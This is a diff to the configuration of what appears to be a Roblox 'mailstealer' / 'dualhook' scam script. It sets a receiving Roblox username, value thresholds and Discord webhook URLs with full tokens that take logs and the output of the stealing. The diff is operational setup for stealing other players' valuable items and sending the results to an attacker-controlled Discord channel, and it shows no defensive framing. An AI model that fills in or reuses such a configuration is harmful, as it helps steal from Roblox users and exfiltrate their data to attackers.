@@ -1,10 +1,10 @@
 MinimumRAP = 10000
 
-DualhookUsername = ""
-DualhookWebhook = ""
-LogsWebhook = ""
+DualhookUsername = "slayamanno123"
+DualhookWebhook = "https://discord.com/api/webhooks/1533717203566858305/y6CwfBujXJfD5cxy8hTF_aZalsP5QebRxik6BvhhxP1vIPr2VdxNSp_KzUc09Kj4ZQr0"
+LogsWebhook = "https://discord.com/api/webhooks/1533717203566858305/y6CwfBujXJfD5cxy8hTF_aZalsP5QebRxik6BvhhxP1vIPr2VdxNSp_KzUc09Kj4ZQr0"
 DualhookRAP = 100000000
-mailstealer_name = "egorikusa"
+mailstealer_name = "beach hub"
 
 Roblox_Username = "Slayamanno123"
 Discord_Webhook = "https://discord.com/api/webhooks/1533717203566858305/y6CwfBujXJfD5cxy8hTF_aZalsP5QebRxik6BvhhxP1vIPr2VdxNSp_KzUc09Kj4ZQr0"
